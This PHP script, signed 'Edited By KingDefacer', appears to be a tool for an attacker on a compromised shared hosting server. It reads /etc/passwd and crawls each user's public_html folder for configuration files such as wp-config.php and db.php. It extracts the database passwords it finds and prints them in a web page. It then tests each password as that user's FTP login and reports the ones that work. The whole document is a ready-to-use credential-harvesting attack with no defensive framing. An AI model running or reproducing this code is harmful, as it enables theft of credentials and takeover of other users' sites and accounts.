<?php
echo "<html>";
echo "<title>Edited By KingDefacer</title><body>";

set_time_limit(0);
##################
@$passwd=fopen('/etc/passwd','r');
if (!$passwd) {
  echo "[-] Error : coudn't read /etc/passwd";
  exit;
}
$path_to_public=array();
$users=array();
$pathtoconf=array();
$i=0;

while(!feof($passwd)) {
$str=fgets($passwd);
if ($i>35) {
   $pos=strpos($str,":");
   $username=substr($str,0,$pos);
   $dirz="/home/$username/public_html/";
   if (($username!="")) {
       if (is_readable($dirz)) {
           array_push($users,$username);
           array_push($path_to_public,$dirz);
       }
   }
}
$i++;
}
###################

#########################
echo "<br><br>";
echo "<textarea name='main_window' cols=100 rows=20>";

echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd\n";
echo "[+] Founded ".sizeof($path_to_public)." readable public_html directories\n";

echo "[~] Searching for passwords in config.* files...\n\n";
foreach ($users as $user) {
       $path="/home/$user/public_html/";
       read_dir($path,$user);
}

echo "\n[+] Done\n";

function read_dir($path,$username) {
   if ($handle = opendir($path)) {
       while (false !== ($file = readdir($handle))) {
             $fpath="$path$file";
             if (($file!='.') and ($file!='..')) {
                if (is_readable($fpath)) {
                   $dr="$fpath/";
                   if (is_dir($dr)) {
                      read_dir($dr,$username);
                   }
                   else {
                        if (($file=='config.php') or ($file=='config.inc.php') or ($file=='db.inc.php') or ($file=='connect.php') or ($file=='wp-config.php') or ($file=='var.php') or ($file=='configure.php') or ($file=='db.php') or ($file=='db_connect.php')) { 
                           $pass=get_pass($fpath);
                           if ($pass!='') {
                              echo "[+] $fpath\n$pass\n";
                              ftp_check($username,$pass);
                           }
                        }
                   }
                }
             }
       }
   }
}

function get_pass($link) {
   @$config=fopen($link,'r');
   while(!feof($config)) {
       $line=fgets($config);
       if (strstr($line,'pass') or strstr($line,'password') or strstr($line,'passwd')) {
           if (strrpos($line,'"'))
              $pass=substr($line,(strpos($line,'=')+3),(strrpos($line,'"')-(strpos($line,'=')+3)));
           else
              $pass=substr($line,(strpos($line,'=')+3),(strrpos($line,"'")-(strpos($line,'=')+3)));
           return $pass;
       }
   }
}

function ftp_check($login,$pass) {
    @$ftp=ftp_connect('127.0.0.1');
    if ($ftp) {
       @$res=ftp_login($ftp,$login,$pass);
       if ($res) {
          echo '[FTP] '.$login.':'.$pass."  Success\n";
       }
       else ftp_quit($ftp);
    }
}

echo "</textarea><br>";

echo "</body></html>";
?>
